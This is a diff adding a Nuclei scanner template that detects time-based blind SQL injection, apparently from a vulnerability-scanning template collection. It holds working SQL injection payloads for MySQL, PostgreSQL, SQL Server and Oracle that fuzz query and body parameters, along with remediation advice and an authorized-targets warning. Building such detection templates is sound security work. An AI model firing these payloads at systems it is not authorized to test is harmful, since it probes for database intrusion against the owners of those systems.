@@ -1,0 +1,83 @@
+id: sqli-time-based
+
+info:
+  name: Time-Based Blind SQL Injection
+  author: n0x
+  severity: critical
+  description: |
+    Uses Nuclei's time_delay analyzer to test whether a SQL payload can make
+    the server delay its response. The analyzer sends alternating baseline and
+    delayed requests and checks that the delay is correlated with the injected
+    sleep primitive, reducing false positives from slow endpoints.
+
+    Payloads cover MySQL, PostgreSQL, Microsoft SQL Server, and Oracle. Run
+    with -dast (or -fuzz on older Nuclei versions) and only against authorized
+    targets.
+  impact: |
+    A blind SQL injection can let an attacker infer database contents,
+    exfiltrate credentials, and in some configurations execute database
+    functions or operating-system commands.
+  remediation: |
+    Use parameterized queries / prepared statements, validate input types,
+    suppress verbose errors, and apply least-privilege database accounts.
+  reference:
+    - https://owasp.org/www-community/attacks/Blind_SQL_Injection
+    - https://docs.projectdiscovery.io/templates/protocols/http/fuzzing-examples
+  classification:
+    cwe-id: CWE-89
+  metadata:
+    max-request: 30
+  tags: sqli,sqli-time,dast,web
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET" || method == "POST"'
+
+    payloads:
+      injections:
+        low:
+          - "' AND SLEEP([SLEEPTIME])-- -"
+          - '" AND SLEEP([SLEEPTIME])-- -'
+          - "') AND SLEEP([SLEEPTIME])-- -"
+          - "' AND pg_sleep([SLEEPTIME])-- -"
+          - '" AND pg_sleep([SLEEPTIME])-- -'
+          - "'; WAITFOR DELAY '0:0:[SLEEPTIME]'-- -"
+          - "' WAITFOR DELAY '0:0:[SLEEPTIME]'-- -"
+        medium:
+          - "1 AND SLEEP([SLEEPTIME])"
+          - "1 AND pg_sleep([SLEEPTIME])"
+          - "1; WAITFOR DELAY '0:0:[SLEEPTIME]'-- -"
+          - "' AND dbms_pipe.receive_message(('a'),[SLEEPTIME])-- -"
+        high:
+          - "' OR SLEEP([SLEEPTIME])-- -"
+          - '" OR pg_sleep([SLEEPTIME])-- -'
+          - "'; SELECT pg_sleep([SLEEPTIME])-- -"
+          - "' OR dbms_pipe.receive_message(('a'),[SLEEPTIME])-- -"
+
+    attack: pitchfork
+    analyzer:
+      name: time_delay
+      parameters:
+        # The analyzer ignores responses shorter than 7s before it starts, so
+        # the initial probe must sleep at least that long.
+        sleep_duration: 8
+        requests_limit: 4
+
+    fuzzing:
+      - parts:
+          - query
+          - body
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{injections}}"
+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: analyzer
+        words:
+          - "true"
